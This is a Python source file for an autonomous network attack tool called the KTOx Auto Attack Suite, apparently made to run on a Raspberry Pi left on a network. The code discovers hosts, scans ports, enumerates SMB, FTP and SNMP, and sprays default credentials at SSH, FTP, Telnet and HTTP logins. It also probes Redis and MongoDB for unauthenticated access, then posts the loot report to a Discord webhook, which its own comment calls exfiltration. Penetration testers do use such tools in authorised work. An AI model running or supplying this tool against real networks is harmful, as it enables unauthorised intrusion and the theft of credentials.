#!/usr/bin/env python3
"""
KTOx Auto Attack Suite (AAS)
==============================
Fully autonomous penetration testing chain. Drop on a network and walk away.

Phases:
  1  DISCOVER   — ARP sweep, find live hosts
  2  FINGERPRINT — Nmap service/version scan per host
  3  ENUMERATE  — SMB shares, HTTP banners, FTP anon, SNMP strings
  4  ATTACK     — Default creds (SSH/FTP/Telnet/HTTP/SMB/Redis/MongoDB)
  5  REPORT     — Timestamped loot file + optional Discord ping

Controls:
  KEY1  Pause / Resume
  KEY2  Skip current target
  KEY3  Abort and save report

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""

import os, sys, time, json, socket, threading, subprocess, ftplib, urllib.request
import urllib.error, ipaddress, re, signal
from datetime import datetime
from pathlib import Path

# ── KTOx path setup ───────────────────────────────────────────────────────────
KTOX_ROOT = "/root/KTOx" if os.path.isdir("/root/KTOx") else os.path.abspath(
    os.path.join(__file__, "..", "..", ".."))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)

try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False

# ── Constants ─────────────────────────────────────────────────────────────────
PAYLOAD_NAME = "auto_attack_suite"
LOOT_DIR     = Path(os.environ.get("PAYLOAD_LOOT_DIR",
                f"/root/ktox_loot/payloads/{PAYLOAD_NAME}"))
LOOT_DIR.mkdir(parents=True, exist_ok=True)

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}

TIMEOUT = 4   # seconds per connection attempt

# ── Default credential lists ──────────────────────────────────────────────────
CREDS = {
    "ssh": [
        ("root",  "root"),    ("root",    "toor"),   ("root",  "password"),
        ("admin", "admin"),   ("admin",   "password"),("admin", "1234"),
        ("pi",    "raspberry"),("pi",     "pi"),      ("user",  "user"),
        ("guest", "guest"),   ("ubuntu",  "ubuntu"),  ("kali",  "kali"),
    ],
    "ftp": [
        ("anonymous", "anonymous"), ("anonymous", ""),
        ("ftp",       "ftp"),       ("admin",     "admin"),
        ("root",      "root"),      ("admin",     ""),
    ],
    "telnet": [
        ("admin",  "admin"),  ("root",   "root"),   ("admin", "1234"),
        ("root",   "toor"),   ("admin",  "password"),("",     ""),
    ],
    "http": [
        ("admin",  "admin"),  ("admin",  "password"),("admin",  "1234"),
        ("root",   "root"),   ("admin",  "admin123"), ("user",   "user"),
        ("admin",  ""),       ("root",   "password"),
    ],
    "snmp": ["public", "private", "community", "default",
             "cisco",  "monitor", "manager",   "write"],
}

# Common HTTP admin paths to check for login panels
HTTP_PATHS = [
    "/", "/admin", "/admin/", "/login", "/manager/html",
    "/wp-login.php", "/phpmyadmin/", "/cgi-bin/luci",
    "/HNAP1/", "/setup.cgi", "/webui", "/index.php",
]

# ── Colours ───────────────────────────────────────────────────────────────────
C_BG      = (5,   7,  20)
C_HEADER  = {
    "DISCOVER":    (20,  60, 140),
    "FINGERPRINT": (80,  40, 140),
    "ENUMERATE":   (20, 100,  60),
    "ATTACK":      (140, 20,  20),
    "REPORT":      (20, 100, 100),
    "DONE":        (20, 120,  40),
    "PAUSED":      (100, 80,   0),
}
C_HIT     = ( 50, 220,  80)
C_MISS    = ( 80,  80,  80)
C_TARGET  = (200, 200, 255)
C_ACTION  = (160, 160, 200)
C_BAR_FG  = ( 50, 140, 255)
C_BAR_BG  = ( 20,  28,  60)
C_WHITE   = (230, 230, 230)
C_YELLOW  = (240, 200,  40)


# ── Font loader ───────────────────────────────────────────────────────────────
def _font(size=9, bold=False):
    paths = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
    ]
    for p in paths:
        if bold and "Bold" not in p:
            continue
        if os.path.exists(p):
            try:
                from PIL import ImageFont as _IF
                return _IF.truetype(p, size)
            except Exception:
                pass
    from PIL import ImageFont as _IF
    return _IF.load_default()

FONT_SM  = _font(9)
FONT_MD  = _font(10, bold=True)
FONT_LG  = _font(12, bold=True)

# ── LCD State ─────────────────────────────────────────────────────────────────
lcd_lock  = threading.Lock()
_lcd      = None
_img      = None
_drw      = None

def lcd_init():
    global _lcd, _img, _drw
    if not HAS_HW:
        return
    GPIO.setmode(GPIO.BCM)
    for p in PINS.values():
        GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    _lcd = LCD_1in44.LCD()
    _lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    _lcd.LCD_Clear()
    _img = Image.new("RGB", (128, 128), C_BG)
    _drw = ImageDraw.Draw(_img)

def lcd_show(phase, target, action, progress, total, hits, paused=False):
    """Render the full AAS status screen."""
    if not HAS_HW or _lcd is None:
        return
    with lcd_lock:
        ph   = "PAUSED" if paused else phase
        hcol = C_HEADER.get(ph, C_HEADER["ATTACK"])

        # Background
        _drw.rectangle([0, 0, 127, 127], fill=C_BG)

        # Phase header bar
        _drw.rectangle([0, 0, 127, 14], fill=hcol)
        _bx = _drw.textbbox((0,0), ph, font=FONT_MD)
        _bw = _bx[2] - _bx[0]
        _drw.text(((128 - _bw)//2, 2), ph, font=FONT_MD, fill=C_WHITE)

        # Hit counter (top right)
        hit_str = f"HITS:{hits}"
        _drw.text((128 - len(hit_str)*6 - 2, 18), hit_str,
                  font=FONT_SM, fill=C_HIT if hits else C_MISS)

        # Target
        _drw.text((2, 18), "TGT:", font=FONT_SM, fill=C_MISS)
        tgt_disp = target[-16:] if len(target) > 16 else target
        _drw.text((30, 18), tgt_disp, font=FONT_SM, fill=C_TARGET)

        # Action (2 lines, 21 chars each)
        action_lines = [action[i:i+20] for i in range(0, min(len(action), 40), 20)]
        _drw.text((2, 30), action_lines[0] if action_lines else "", font=FONT_SM, fill=C_ACTION)
        if len(action_lines) > 1:
            _drw.text((2, 41), action_lines[1], font=FONT_SM, fill=C_ACTION)

        # Divider
        _drw.line([(0, 54), (128, 54)], fill=hcol, width=1)

        # Last 4 hits
        # (stored externally, passed via global for simplicity)
        y = 57
        for line in _recent_hits[-4:]:
            col = C_HIT if line.startswith("+") else C_MISS
            _drw.text((2, y), line[:21], font=FONT_SM, fill=col)
            y += 11

        # Progress bar
        BAR_Y = 112
        _drw.rectangle([2, BAR_Y, 125, BAR_Y+6], fill=C_BAR_BG)
        if total > 0:
            filled = int(123 * progress / total)
            if filled > 0:
                _drw.rectangle([2, BAR_Y, 2+filled, BAR_Y+6], fill=C_BAR_FG)
        prog_str = f"{progress}/{total}"
        _bx2 = _drw.textbbox((0,0), prog_str, font=FONT_SM)
        _bw2 = _bx2[2] - _bx2[0]
        _drw.text(((128-_bw2)//2, 121), prog_str, font=FONT_SM, fill=C_YELLOW)

        _lcd.LCD_ShowImage(_img, 0, 0)

def lcd_big(title, lines, color=(20,60,140)):
    """Simple message screen."""
    if not HAS_HW or _lcd is None:
        return
    with lcd_lock:
        _drw.rectangle([0, 0, 127, 127], fill=C_BG)
        _drw.rectangle([0, 0, 127, 14], fill=color)
        _bx = _drw.textbbox((0,0), title, font=FONT_MD)
        _bw = _bx[2] - _bx[0]
        _drw.text(((128-_bw)//2, 2), title, font=FONT_MD, fill=C_WHITE)
        y = 20
        for line in lines[:7]:
            col = C_HIT   if line.startswith("+") else \
                  (255,80,80) if line.startswith("!") else \
                  C_YELLOW if line.startswith("~") else C_WHITE
            _drw.text((4, y), line[:21], font=FONT_SM, fill=col)
            y += 13
        _lcd.LCD_ShowImage(_img, 0, 0)


# ── Global state ──────────────────────────────────────────────────────────────
_abort      = threading.Event()
_pause      = threading.Event()
_skip       = threading.Event()
_recent_hits = []   # last 4 result lines shown on LCD
_hits_total  = 0

def _add_hit(line):
    global _hits_total
    _recent_hits.append(line)
    if len(_recent_hits) > 4:
        _recent_hits.pop(0)
    if line.startswith("+"):
        _hits_total += 1

def _wait_if_paused():
    while _pause.is_set() and not _abort.is_set():
        time.sleep(0.2)

# ── Button watcher thread ─────────────────────────────────────────────────────
def _button_watcher():
    if not HAS_HW:
        return
    while not _abort.is_set():
        if GPIO.input(PINS["KEY3"]) == 0:
            _abort.set()
            break
        if GPIO.input(PINS["KEY1"]) == 0:
            if _pause.is_set():
                _pause.clear()
            else:
                _pause.set()
            time.sleep(0.4)   # debounce
        if GPIO.input(PINS["KEY2"]) == 0:
            _skip.set()
            time.sleep(0.4)
        time.sleep(0.05)

# ── Network helpers ───────────────────────────────────────────────────────────
def _get_local_subnet():
    """Return best-guess /24 subnet string and interface name."""
    try:
        import netifaces
        gw = netifaces.gateways()
        gw_ip, iface = gw["default"][netifaces.AF_INET][:2]
        net = gw_ip.rsplit(".", 1)[0] + ".0/24"
        return net, iface
    except Exception:
        pass
    # fallback: route table
    try:
        out = subprocess.check_output(["ip", "route"], text=True, timeout=5)
        for line in out.splitlines():
            if "default" in line:
                parts = line.split()
                gw = parts[2]
                dev = parts[4] if len(parts) > 4 else "eth0"
                return gw.rsplit(".", 1)[0] + ".0/24", dev
    except Exception:
        pass
    return "192.168.1.0/24", "eth0"

def _tcp_open(ip, port, timeout=TIMEOUT):
    """Return True if TCP port is open."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception:
        return False

def _banner(ip, port, timeout=TIMEOUT):
    """Grab a service banner."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            return s.recv(256).decode(errors="ignore").strip()
    except Exception:
        return ""

# ── Phase 1: Discover ─────────────────────────────────────────────────────────
def phase_discover(subnet):
    """ARP + nmap ping sweep. Returns list of live IPs."""
    _add_hit(f"~ Scanning {subnet}")
    lcd_show("DISCOVER", subnet, "ARP sweep...", 0, 1, _hits_total)

    hosts = []
    # Try nmap first (most reliable)
    try:
        out = subprocess.check_output(
            ["nmap", "-sn", "-T4", "--host-timeout", "10s", subnet],
            text=True, stderr=subprocess.DEVNULL, timeout=120)
        for line in out.splitlines():
            m = re.search(r"Nmap scan report for (?:\S+ \()?(\d+\.\d+\.\d+\.\d+)", line)
            if m:
                hosts.append(m.group(1))
    except Exception:
        pass

    # Fallback: arp-scan
    if not hosts:
        try:
            out = subprocess.check_output(
                ["arp-scan", "--localnet", "--quiet"],
                text=True, stderr=subprocess.DEVNULL, timeout=60)
            for line in out.splitlines():
                m = re.match(r"(\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    hosts.append(m.group(1))
        except Exception:
            pass

    # Fallback: ping sweep
    if not hosts:
        net = ipaddress.ip_network(subnet, strict=False)
        for host in net.hosts():
            if _abort.is_set():
                break
            ip = str(host)
            try:
                r = subprocess.call(["ping", "-c1", "-W1", ip],
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
                if r == 0:
                    hosts.append(ip)
            except Exception:
                pass

    # Remove self
    try:
        self_ips = socket.gethostbyname_ex(socket.gethostname())[2]
        hosts = [h for h in hosts if h not in self_ips]
    except Exception:
        pass

    _add_hit(f"+ Found {len(hosts)} hosts")
    return list(dict.fromkeys(hosts))   # dedupe, preserve order

# ── Phase 2: Fingerprint ──────────────────────────────────────────────────────
COMMON_PORTS = [21, 22, 23, 25, 80, 110, 139, 143, 443, 445,
                3306, 3389, 5900, 6379, 8080, 8443, 27017]

def phase_fingerprint(ip):
    """
    Quick port scan. Returns dict {port: service_name}.
    Uses nmap if available, else raw TCP connect.
    """
    open_ports = {}
    try:
        out = subprocess.check_output(
            ["nmap", "-sV", "-T4", "--open",
             "-p", ",".join(map(str, COMMON_PORTS)),
             "--host-timeout", "30s", ip],
            text=True, stderr=subprocess.DEVNULL, timeout=60)
        for line in out.splitlines():
            m = re.match(r"(\d+)/tcp\s+open\s+(\S+)", line)
            if m:
                open_ports[int(m.group(1))] = m.group(2)
    except Exception:
        # Fallback: raw connect
        PORT_NAMES = {21:"ftp",22:"ssh",23:"telnet",25:"smtp",80:"http",
                      110:"pop3",139:"smb",143:"imap",443:"https",445:"smb",
                      3306:"mysql",3389:"rdp",5900:"vnc",6379:"redis",
                      8080:"http",8443:"https",27017:"mongodb"}
        for port, name in PORT_NAMES.items():
            if _abort.is_set(): break
            if _tcp_open(ip, port, timeout=2):
                open_ports[port] = name
    return open_ports


# ── Phase 3: Enumerate ────────────────────────────────────────────────────────
def enum_smb(ip):
    """Null-session SMB enumeration. Returns list of findings."""
    findings = []
    try:
        out = subprocess.check_output(
            ["smbclient", "-L", ip, "-N", "--no-pass"],
            text=True, stderr=subprocess.STDOUT, timeout=10)
        shares = re.findall(r"^\s+(\S+)\s+Disk", out, re.MULTILINE)
        for s in shares:
            findings.append(f"+ SMB share: \\\\{ip}\\{s}")
        if findings:
            findings.insert(0, f"+ SMB null session: {ip}")
        else:
            findings.append(f"~ SMB: {ip} (no anon shares)")
    except Exception:
        pass

    # Try enum4linux quick run
    try:
        out = subprocess.check_output(
            ["enum4linux", "-U", ip],
            text=True, stderr=subprocess.DEVNULL, timeout=20)
        users = re.findall(r"user:\[(\w+)\]", out)
        for u in users[:5]:
            findings.append(f"~ SMB user: {u}@{ip}")
    except Exception:
        pass
    return findings

def enum_http(ip, port=80, https=False):
    """Grab HTTP banner + title + auth header."""
    findings = []
    scheme = "https" if https else "http"
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            f"{scheme}://{ip}:{port}/",
            headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=TIMEOUT,
                                    context=ctx if https else None) as r:
            body  = r.read(2048).decode(errors="ignore")
            hdrs  = dict(r.getheaders())
            server = hdrs.get("Server", "")
            title  = re.search(r"<title[^>]*>(.*?)</title>", body, re.I|re.S)
            if server:
                findings.append(f"~ HTTP {port}: {server[:30]}")
            if title:
                findings.append(f"~ Title: {title.group(1).strip()[:28]}")
            if "WWW-Authenticate" in hdrs:
                findings.append(f"+ HTTP Basic Auth on :{port}")
            if any(k in body.lower() for k in
                   ["username","password","login","admin"]):
                findings.append(f"+ Login page on :{port}")
    except Exception:
        pass
    return findings

def enum_ftp(ip):
    """Check FTP anonymous login."""
    findings = []
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=TIMEOUT)
        ftp.login("anonymous", "anonymous@")
        files = ftp.nlst()[:5]
        findings.append(f"+ FTP anon login: {ip}")
        for f in files:
            findings.append(f"  /{f}")
        ftp.quit()
    except ftplib.error_perm:
        pass   # anonymous not allowed — not a finding
    except Exception:
        pass
    return findings

def enum_snmp(ip):
    """Try common SNMP community strings."""
    findings = []
    for community in CREDS["snmp"]:
        if _abort.is_set():
            break
        try:
            out = subprocess.check_output(
                ["snmpwalk", "-v2c", "-c", community,
                 "-t", "2", ip, "sysDescr"],
                text=True, stderr=subprocess.DEVNULL, timeout=5)
            if "STRING:" in out:
                desc = re.search(r'STRING:\s+"?(.+?)"?$', out, re.M)
                findings.append(f"+ SNMP community '{community}': {ip}")
                if desc:
                    findings.append(f"  {desc.group(1)[:40]}")
                break
        except Exception:
            pass
    return findings

# ── Phase 4: Attack ───────────────────────────────────────────────────────────
def attack_ssh(ip, update_cb):
    """SSH default credential spray. Returns list of hits."""
    hits = []
    for user, pwd in CREDS["ssh"]:
        if _abort.is_set() or _skip.is_set():
            break
        update_cb(f"SSH {user}:{pwd}")
        try:
            r = subprocess.run(
                ["sshpass", "-p", pwd, "ssh",
                 "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=4",
                 "-o", "BatchMode=no",
                 f"{user}@{ip}", "id"],
                capture_output=True, text=True, timeout=8)
            if r.returncode == 0 and "uid=" in r.stdout:
                hits.append(f"+ SSH {ip}  {user}:{pwd}  [{r.stdout.strip()[:20]}]")
                break   # first valid cred is enough
        except Exception:
            pass
        time.sleep(0.1)
    return hits

def attack_ftp(ip, update_cb):
    """FTP default credential spray."""
    hits = []
    for user, pwd in CREDS["ftp"]:
        if _abort.is_set() or _skip.is_set():
            break
        update_cb(f"FTP {user}:{pwd}")
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, 21, timeout=TIMEOUT)
            ftp.login(user, pwd)
            hits.append(f"+ FTP {ip}  {user}:{pwd}")
            try: ftp.quit()
            except: pass
            break
        except ftplib.error_perm:
            pass
        except Exception:
            break
    return hits

def attack_telnet(ip, update_cb):
    """Telnet default credential spray via expect-style socket."""
    hits = []
    for user, pwd in CREDS["telnet"]:
        if _abort.is_set() or _skip.is_set():
            break
        update_cb(f"Telnet {user}:{pwd}")
        try:
            import telnetlib
            tn = telnetlib.Telnet(ip, 23, timeout=TIMEOUT)
            out = tn.read_until(b"login:", timeout=3).lower()
            if b"login" in out or b"username" in out:
                tn.write((user + "\n").encode())
                tn.read_until(b"assword", timeout=3)
                tn.write((pwd + "\n").encode())
                resp = tn.read_until(b"$", timeout=4).decode(errors="ignore")
                if any(c in resp for c in ["$", "#", ">"]):
                    hits.append(f"+ Telnet {ip}  {user}:{pwd}")
                    tn.close()
                    break
            tn.close()
        except Exception:
            pass
        time.sleep(0.2)
    return hits

def attack_http_basic(ip, port, update_cb, https=False):
    """HTTP Basic Auth spray on detected login endpoints."""
    hits = []
    scheme = "https" if https else "http"
    import base64, ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for user, pwd in CREDS["http"]:
        if _abort.is_set() or _skip.is_set():
            break
        update_cb(f"HTTP {port} {user}:{pwd}")
        token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        for path in HTTP_PATHS[:4]:
            try:
                req = urllib.request.Request(
                    f"{scheme}://{ip}:{port}{path}",
                    headers={"Authorization": f"Basic {token}",
                             "User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(
                        req, timeout=TIMEOUT,
                        context=ctx if https else None) as r:
                    if r.status == 200:
                        hits.append(
                            f"+ HTTP Basic {ip}:{port}{path}  {user}:{pwd}")
                        return hits
            except urllib.error.HTTPError as e:
                if e.code not in (401, 403):
                    pass
            except Exception:
                break
        time.sleep(0.1)
    return hits

def attack_redis(ip, update_cb):
    """Check Redis unauthenticated access."""
    update_cb("Redis unauth check")
    try:
        with socket.create_connection((ip, 6379), timeout=TIMEOUT) as s:
            s.sendall(b"PING\r\n")
            resp = s.recv(64).decode(errors="ignore")
            if "+PONG" in resp:
                # Try INFO to confirm RW access
                s.sendall(b"INFO server\r\n")
                info = s.recv(512).decode(errors="ignore")
                ver = re.search(r"redis_version:([\d.]+)", info)
                v = ver.group(1) if ver else "?"
                return [f"+ Redis unauth {ip}:6379  v{v}"]
    except Exception:
        pass
    return []

def attack_mongodb(ip, update_cb):
    """Check MongoDB unauthenticated access."""
    update_cb("MongoDB unauth check")
    # Send minimal MongoDB isMaster wire protocol message
    try:
        with socket.create_connection((ip, 27017), timeout=TIMEOUT) as s:
            # MongoDB OP_QUERY for isMaster
            msg = (b"\x41\x00\x00\x00"  # messageLength
                   b"\x01\x00\x00\x00"  # requestID
                   b"\x00\x00\x00\x00"  # responseTo
                   b"\xd4\x07\x00\x00"  # opCode OP_QUERY
                   b"\x00\x00\x00\x00"  # flags
                   b"admin.$cmd\x00"    # fullCollectionName
                   b"\x00\x00\x00\x00"  # numberToSkip
                   b"\x01\x00\x00\x00"  # numberToReturn
                   b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00")
            s.sendall(msg)
            resp = s.recv(256)
            if b"ismaster" in resp.lower() or b"isWritablePrimary" in resp:
                return [f"+ MongoDB unauth {ip}:27017"]
    except Exception:
        pass
    return []


# ── Phase 5: Report ───────────────────────────────────────────────────────────
def save_report(results, subnet, elapsed):
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = LOOT_DIR / f"aas_{ts}.txt"
    total_hits = sum(len(v.get("hits", [])) for v in results.values())
    lines = [
        "=" * 60,
        f"  KTOx Auto Attack Suite — Report",
        f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Subnet : {subnet}",
        f"  Hosts  : {len(results)}",
        f"  Hits   : {total_hits}",
        f"  Elapsed: {int(elapsed)}s",
        "=" * 60, "",
    ]
    for ip, data in sorted(results.items()):
        lines.append(f"\n[{ip}]")
        ports = data.get("ports", {})
        if ports:
            lines.append(f"  Ports : {', '.join(f'{p}/{s}' for p,s in ports.items())}")
        for finding in data.get("enum", []):
            lines.append(f"  {finding}")
        for hit in data.get("hits", []):
            lines.append(f"  {hit}")
        if not data.get("enum") and not data.get("hits"):
            lines.append("  (no findings)")

    out_path.write_text("\n".join(lines))
    print(f"[AAS] Report saved: {out_path}", flush=True)

    # Discord exfil if webhook configured
    _try_discord_notify(out_path, total_hits, subnet)
    return out_path, total_hits

def _try_discord_notify(report_path, total_hits, subnet):
    webhook = os.environ.get("KTOX_DISCORD_WEBHOOK", "")
    if not webhook or "discord.com" not in webhook:
        # Try reading from config file
        cfg_path = Path("/root/KTOx/ktox_config.json")
        if cfg_path.exists():
            try:
                cfg = json.loads(cfg_path.read_text())
                webhook = cfg.get("discord_webhook", "")
            except Exception:
                pass
    if not webhook:
        return
    try:
        content = (f"🎯 **Auto Attack Suite Complete**\n"
                   f"Subnet: `{subnet}`\n"
                   f"Hits: **{total_hits}**\n"
                   f"```\n{report_path.read_text()[-1800:]}\n```")
        data = json.dumps({"content": content}).encode()
        req  = urllib.request.Request(
            webhook,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST")
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

# ── Main orchestrator ─────────────────────────────────────────────────────────
def run():
    global _hits_total
    start_time = time.time()
    results    = {}

    # ── Init LCD + buttons ────────────────────────────────────────────────────
    lcd_init()
    if HAS_HW:
        t = threading.Thread(target=_button_watcher, daemon=True)
        t.start()

    lcd_big("AUTO ATTACK", [
        "~ Initialising...",
        "",
        "KEY1  Pause/Resume",
        "KEY2  Skip target",
        "KEY3  Abort + save",
    ], color=(140, 20, 20))
    time.sleep(2)

    # ── Phase 1: Discover ─────────────────────────────────────────────────────
    subnet, iface = _get_local_subnet()
    lcd_show("DISCOVER", subnet, "Finding hosts...", 0, 1, 0)
    hosts = phase_discover(subnet)

    if _abort.is_set() or not hosts:
        lcd_big("ABORTED", ["! No hosts found",
                             "~ Check interface"], color=(120,20,20))
        time.sleep(3)
        return

    lcd_big("DISCOVER", [f"+ {len(hosts)} hosts found",
                          "~ Starting attack..."], color=C_HEADER["DISCOVER"])
    time.sleep(1.5)

    total = len(hosts)

    # ── Phases 2-4: Per-host loop ─────────────────────────────────────────────
    for idx, ip in enumerate(hosts):
        if _abort.is_set():
            break

        _skip.clear()
        _wait_if_paused()

        results[ip] = {"ports": {}, "enum": [], "hits": []}

        # ── Fingerprint ───────────────────────────────────────────────────────
        lcd_show("FINGERPRINT", ip, "Port scanning...", idx, total, _hits_total)
        ports = phase_fingerprint(ip)
        results[ip]["ports"] = ports

        if not ports or _abort.is_set() or _skip.is_set():
            _add_hit(f"~ {ip}: no open ports")
            continue

        _add_hit(f"~ {ip}: {len(ports)} ports")
        port_str = ",".join(str(p) for p in list(ports)[:4])
        lcd_show("FINGERPRINT", ip, f"Open: {port_str}", idx, total, _hits_total)
        time.sleep(0.3)

        # ── Enumerate ─────────────────────────────────────────────────────────
        lcd_show("ENUMERATE", ip, "Enumerating...", idx, total, _hits_total)

        if 445 in ports or 139 in ports:
            _wait_if_paused()
            if not _skip.is_set():
                lcd_show("ENUMERATE", ip, "SMB null session", idx, total, _hits_total)
                for f in enum_smb(ip):
                    results[ip]["enum"].append(f)
                    _add_hit(f)

        for port in [80, 8080]:
            if port in ports and not _skip.is_set():
                _wait_if_paused()
                lcd_show("ENUMERATE", ip, f"HTTP banner :{port}", idx, total, _hits_total)
                for f in enum_http(ip, port, https=False):
                    results[ip]["enum"].append(f)

        for port in [443, 8443]:
            if port in ports and not _skip.is_set():
                _wait_if_paused()
                lcd_show("ENUMERATE", ip, f"HTTPS banner :{port}", idx, total, _hits_total)
                for f in enum_http(ip, port, https=True):
                    results[ip]["enum"].append(f)

        if 21 in ports and not _skip.is_set():
            _wait_if_paused()
            lcd_show("ENUMERATE", ip, "FTP anon check", idx, total, _hits_total)
            for f in enum_ftp(ip):
                results[ip]["enum"].append(f)
                _add_hit(f)

        if 161 in ports and not _skip.is_set():
            _wait_if_paused()
            lcd_show("ENUMERATE", ip, "SNMP community", idx, total, _hits_total)
            for f in enum_snmp(ip):
                results[ip]["enum"].append(f)
                _add_hit(f)

        # ── Attack ────────────────────────────────────────────────────────────
        def _cb(action):
            lcd_show("ATTACK", ip, action, idx, total, _hits_total,
                     paused=_pause.is_set())

        if 22 in ports and not _skip.is_set():
            _wait_if_paused()
            for h in attack_ssh(ip, _cb):
                results[ip]["hits"].append(h)
                _add_hit(h)
                _hits_total += 0  # already counted in attack_ssh via _add_hit

        if 21 in ports and not _skip.is_set():
            _wait_if_paused()
            for h in attack_ftp(ip, _cb):
                results[ip]["hits"].append(h)
                _add_hit(h)

        if 23 in ports and not _skip.is_set():
            _wait_if_paused()
            for h in attack_telnet(ip, _cb):
                results[ip]["hits"].append(h)
                _add_hit(h)

        for port in [80, 8080]:
            if port in ports and not _skip.is_set():
                _wait_if_paused()
                for h in attack_http_basic(ip, port, _cb):
                    results[ip]["hits"].append(h)
                    _add_hit(h)

        for port in [443, 8443]:
            if port in ports and not _skip.is_set():
                _wait_if_paused()
                for h in attack_http_basic(ip, port, _cb, https=True):
                    results[ip]["hits"].append(h)
                    _add_hit(h)

        if 6379 in ports and not _skip.is_set():
            _wait_if_paused()
            for h in attack_redis(ip, _cb):
                results[ip]["hits"].append(h)
                _add_hit(h)

        if 27017 in ports and not _skip.is_set():
            _wait_if_paused()
            for h in attack_mongodb(ip, _cb):
                results[ip]["hits"].append(h)
                _add_hit(h)

        lcd_show("ATTACK", ip, "Done", idx + 1, total, _hits_total)
        time.sleep(0.2)

    # ── Phase 5: Report ───────────────────────────────────────────────────────
    elapsed = time.time() - start_time
    lcd_show("REPORT", "Saving...", "Writing loot file", total, total, _hits_total)
    report_path, total_found = save_report(results, subnet, elapsed)

    summary = [
        f"+ Hosts : {len(results)}",
        f"+ Hits  : {total_found}",
        f"~ Time  : {int(elapsed)}s",
        f"~ Saved to loot",
        "",
        "KEY3 to exit",
    ]
    lcd_big("DONE", summary, color=C_HEADER["DONE"])

    # Wait for KEY3
    while HAS_HW and not _abort.is_set():
        if GPIO.input(PINS["KEY3"]) == 0:
            break
        time.sleep(0.1)

    if HAS_HW:
        _lcd.LCD_Clear()
        GPIO.cleanup()

# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        pass
    finally:
        if HAS_HW:
            try:
                GPIO.cleanup()
            except Exception:
                pass
